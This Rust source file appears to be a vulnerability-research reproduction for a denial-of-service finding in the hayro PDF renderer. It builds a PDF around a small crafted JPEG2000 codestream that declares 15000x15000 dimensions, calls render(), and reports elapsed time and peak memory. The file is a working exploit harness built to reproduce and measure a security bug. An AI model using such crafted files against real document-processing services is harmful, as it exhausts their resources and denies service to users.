// Standalone reproduction for candidate 011: does a JPEG2000 codestream exist that lands
// *under* candidate 008's `MAX_TOTAL_SAMPLE_COUNT` cap (256M samples, checked against the
// *decoded*, post-`skipped_resolution_levels`-downscale sample count) while still being a
// meaningful DoS on its own - as opposed to candidate 010's PoC, which lands far over the cap
// and is rejected near-instantly?
//
// This drives a real, on-disk-shaped PDF (classic xref table, real `/JPXDecode` image XObject,
// placed small - `cm 20 0 0 20 90 90` on a 200x200 page - so the real, unmodified, top-level
// `hayro::render()` computes a small CTM-derived downscale hint) through the real, public
// `hayro::render()` entry point - the same function `hayro/examples/render.rs` itself calls.
// The embedded JPEG2000 codestream (`malicious.j2c`, 80 bytes) is a real, from-scratch,
// legitimately-parseable raw J2C codestream (SOC/SIZ/COD/QCD/SOT/SOD, 0 bytes of tile-part body
// data - no entropy-coded payload is needed to trigger this, since the vulnerable work happens
// before any packet data is read) declaring a raw size of 15000x15000, a single decomposition
// level (2 resolution levels total), and the smallest legal code-block size (4x4). The PDF byte
// stream is the genuine external/adversarial input; nothing about the trigger path is faked or
// hand-simulated.
//
// Exit code convention: 0 = ran to completion (prints elapsed time and peak RSS either way -
// "reproduced" is judged by the printed numbers, not a crash/abort, since this is a DoS-via-cost
// finding, not a crash).

use hayro::hayro_interpret::InterpreterSettings;
use hayro::hayro_syntax::Pdf;
use hayro::{RenderCache, RenderSettings, render};
use std::time::Instant;

const JP2C: &[u8] = include_bytes!("malicious.j2c");

fn build_poc_pdf() -> Vec<u8> {
    let mut img_dict = format!(
        "<< /Type /XObject /Subtype /Image /Width 15000 /Height 15000 \
/BitsPerComponent 8 /ColorSpace /DeviceGray /Filter /JPXDecode /Length {} >>",
        JP2C.len()
    )
    .into_bytes();
    let mut obj4 = Vec::new();
    obj4.append(&mut img_dict);
    obj4.extend_from_slice(b"\nstream\n");
    obj4.extend_from_slice(JP2C);
    obj4.extend_from_slice(b"\nendstream");

    // Placed *small* on the page (20x20 out of a 200x200 page) so that hayro's own
    // CTM-derived downscale hint requests a small target resolution - the point being that
    // even though the *decoder* is asked for a tiny image, the codestream's raw declared
    // dimensions (independent of the hint) still drive the vulnerable code path.
    let content: &[u8] = b"q 20 0 0 20 90 90 cm /Im0 Do Q";
    let mut obj5 = format!("<< /Length {} >>\nstream\n", content.len()).into_bytes();
    obj5.extend_from_slice(content);
    obj5.extend_from_slice(b"\nendstream");

    let objs: Vec<Vec<u8>> = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>".to_vec(),
        obj4,
        obj5,
    ];

    let mut out = Vec::new();
    out.extend_from_slice(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");

    let mut offsets = Vec::new();
    for (i, obj) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
        out.extend_from_slice(obj);
        out.extend_from_slice(b"\nendobj\n");
    }

    let xref_offset = out.len();
    let n = objs.len() + 1;
    out.extend_from_slice(format!("xref\n0 {n}\n").as_bytes());
    out.extend_from_slice(b"0000000000 65535 f \n");
    for off in &offsets {
        out.extend_from_slice(format!("{off:010} 00000 n \n").as_bytes());
    }
    out.extend_from_slice(format!("trailer\n<< /Size {n} /Root 1 0 R >>\n").as_bytes());
    out.extend_from_slice(format!("startxref\n{xref_offset}\n%%EOF").as_bytes());

    out
}

fn peak_rss_kb() -> Option<u64> {
    let status = std::fs::read_to_string("/proc/self/status").ok()?;
    for line in status.lines() {
        if let Some(rest) = line.strip_prefix("VmHWM:") {
            return rest.trim().trim_end_matches(" kB").trim().parse().ok();
        }
    }
    None
}

fn main() {
    let pdf_bytes = build_poc_pdf();
    println!(
        "built PoC PDF: {} bytes (embedded JPEG2000 codestream: {} bytes, declares \
15000x15000 raw, 1 decomposition level, 4x4 code blocks; placed as a 20x20 thumbnail via \
`cm 20 0 0 20 90 90` on a 200x200 page)",
        pdf_bytes.len(),
        JP2C.len()
    );

    let pdf = Pdf::new(pdf_bytes).expect("PoC PDF should parse");
    let page = &pdf.pages()[0];

    let interpreter_settings = InterpreterSettings::default();
    let render_settings = RenderSettings::default();
    let cache = RenderCache::new();

    println!("calling the real, public hayro::render() and timing it...");

    let start = Instant::now();
    let pixmap = render(page, &cache, &interpreter_settings, &render_settings);
    let elapsed = start.elapsed();

    println!(
        "render() returned after {:?} (pixmap {}x{})",
        elapsed,
        pixmap.width(),
        pixmap.height()
    );

    if let Some(kb) = peak_rss_kb() {
        println!("peak RSS (VmHWM): {kb} kB (~{:.2} MB)", kb as f64 / 1024.0);
    }

    if elapsed.as_millis() >= 500 {
        println!(
            "SLOW: took >= 500ms to render a 20x20 thumbnail placement - consistent with the \
suspected raw-dimension-driven cost, independent of the decoded/capped sample count"
        );
    } else {
        println!("FAST: rendering completed quickly");
    }
}
